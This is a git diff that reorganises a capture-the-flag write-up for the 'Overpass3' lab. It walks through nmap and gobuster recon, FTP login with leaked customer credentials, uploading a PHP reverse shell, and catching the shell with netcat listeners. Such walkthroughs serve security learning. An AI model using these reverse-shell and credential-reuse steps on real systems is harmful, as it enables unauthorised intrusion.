@@ -1,16 +1,10 @@
 # Overpass3
 
-Ok so no instructions, nothing. Just three spaces for web/user/root flags.
-
-Nice.
-
-
-## Recon
+## 1. Recon
 
 we run the nmap scan and the gobuster parallely, while we explore the website.
 
-`❯ nmap -script=vuln -sV -A -T4 10.10.16.10`
-
+### 1.1 Port Scanning
 ```
 ❯ nmap -script=vuln -sV -A -T4 -Pn 10.10.16.10
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -37,6 +31,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 97.52 seconds
 ```
 
+### 1.2 Web Enumeration + Exploration
 `❯ gobuster dir -u 10.10.16.10 -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -x "html,php,txt"`
 
 well this didn't workout well. But, from the nmap scan, we have two directories listed:
@@ -73,9 +68,25 @@ Nice, we have all the customer details neatly bundled up for us. Now, lets conve
 
 So we have some customer names and their username-password combinations and, some credit card information XD
 
-lets try logging in using this from ftp. `paradox` username works! okay okay. lets try putting a file on the server using `put filename`. So that works too. Lets upload a php reverse shell and see how that works. Don't forget to change the `$ip` to your `tun0`.
+### 1.3 FTP
+lets try logging in using this from ftp. `paradox` username works! okay okay. lets try putting a file on the server using `put filename`. So that works too. Lets upload a php reverse shell and see how that works. Don't forget to change the `$ip` to your `tun0`, or the relevant `tun`.
 
-Meanwhile, setup netcat to listen on the port specified. I did not change so its `1234` for me. 
+```
+❯ ftp 10.10.181.222
+...
+ftp> pwd
+257 "/" is the current directory
+ftp> put phpreverseshell.php
+...
+ftp> ls
+...
+-rw-r--r--    1 1001     1001         5494 Mar 07 03:10 phpreverseshell.php
+226 Directory send OK.
+```
+
+
+## 2. Foothold
+Setup netcat to listen on the port specified. I did not change so its `1234` for me. 
 
 `❯ nc -lnvp 1234`
 
@@ -97,56 +108,7 @@ sh: no job control in this shell
 
 works!
 
-so now we need to escalate priviledges ...
-
-===
-
-I'm back baby!
-
-## Priv Esc
-
-Let's first login again and put the php file.
-
-```
-❯ ftp 10.10.181.222
-Connected to 10.10.181.222.
-220 (vsFTPd 3.0.3)
-Name (10.10.181.222:tanishq): paradox
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
--rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
--rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
--rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
--rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
-226 Directory send OK.
-ftp> pwd
-257 "/" is the current directory
-ftp> put phpreverseshell.php
-local: phpreverseshell.php remote: phpreverseshell.php
-200 PORT command successful. Consider using PASV.
-150 Ok to send data.
-226 Transfer complete.
-5494 bytes sent in 0.00 secs (27.2890 MB/s)
-ftp> ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
--rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
--rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
--rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
--rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
--rw-r--r--    1 1001     1001         5494 Mar 07 03:10 phpreverseshell.php
-226 Directory send OK.
-```
-
-
+## 3. Priv Esc
 ```
 ❯ nc -lnvp 1337
 listening on [any] 1337 ...
